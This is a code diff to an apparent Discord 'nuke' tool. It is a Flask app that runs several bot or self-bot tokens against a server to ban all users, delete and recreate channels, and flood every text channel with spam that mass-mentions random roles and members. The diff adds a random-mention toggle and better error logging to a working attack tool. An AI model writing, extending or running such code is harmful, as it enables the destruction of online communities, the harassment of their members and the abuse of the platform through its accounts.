@@ -20,8 +20,7 @@ class DiscordBot(discord.Client):
         self.nukeLatency = latency
         self.message = message
         if mode == 0:
-            self.allUserBan = option[0]
-            self.allChannelDelete = option[1]
+            self.allUserBan, self.allChannelDelete, self.randomMention = option
         self.mode = mode
     async def banUser(self, user:discord.Member):
         try:
@@ -43,8 +42,8 @@ class DiscordBot(discord.Client):
         try:
             await channel.send(message)
             logs[self.logId] += "[+]Success"
-        except:
-            logs[self.logId] += "[-]Failed"
+        except Exception as e:
+            logs[self.logId] += f"[-]Failed {e}"
             self.channels.remove(channel)
         logs[self.logId] += f" | {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
         await asyncio.sleep(latencyMs)
@@ -64,7 +63,7 @@ class DiscordBot(discord.Client):
         try:
             if self.allChannelDelete:
                 await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
-            self.channels = list(guild.channels)
+            self.channels = list(guild.text_channels)
             random.shuffle(self.channels)
             roles = self.guild.roles
             members = self.guild.members
@@ -76,24 +75,25 @@ class DiscordBot(discord.Client):
                 logs[self.logId] += "--- Nuke ---\n"
                 for channel in self.channels:
                     bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))+"\n"
-                    try:
-                        if len(roles) >= 5:
-                            for role in random.sample(roles, 5):
-                                bMessage += f"<@&{role.id}>\n"
-                        else:
-                            for role in roles:
-                                bMessage += f"<@&{role.id}>\n"
-                    except:
-                        pass
-                    try:
-                        if len(members) >= 12:
-                            for member in random.sample(members, 12):
-                                bMessage += f"<@{member.id}>\n"
-                        else:
-                            for member in members:
-                                bMessage += f"<@{member.id}>\n"
-                    except:
-                        pass
+                    if self.randomMention:
+                        try:
+                            if len(roles) >= 5:
+                                for role in random.sample(roles, 5):
+                                    bMessage += f"<@&{role.id}>\n"
+                            else:
+                                for role in roles:
+                                    bMessage += f"<@&{role.id}>\n"
+                        except:
+                            pass
+                        try:
+                            if len(members) >= 12:
+                                for member in random.sample(members, 12):
+                                    bMessage += f"<@{member.id}>\n"
+                            else:
+                                for member in members:
+                                    bMessage += f"<@{member.id}>\n"
+                        except:
+                            pass
                     await self.sendMessage(bMessage, channel, latency*0.001)
         except:
             logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
@@ -152,6 +152,7 @@ def nuke():
         message = request.form["message"]
         allUserBan = "allUserBan" in request.form
         allChannelDelete = "allChannelDelete" in request.form
+        randomMention = "randomMention" in request.form
         
         logs[logId] += f"""-- Value you entered --
 Tokens:{tokens}
@@ -165,7 +166,7 @@ AllChannelDelete:{allChannelDelete}
 """
         
         for token in tokens:
-            bot = DiscordBot(logId, token, guildId, channelName, latency, message, [allUserBan, allChannelDelete], 0)
+            bot = DiscordBot(logId, token, guildId, channelName, latency, message, [allUserBan, allChannelDelete, randomMention], 0)
             botThread = threading.Thread(target=bot.runBot, daemon=True)
             botThread.start()
         return render_template('selfBotNuke.html', logId=logId)
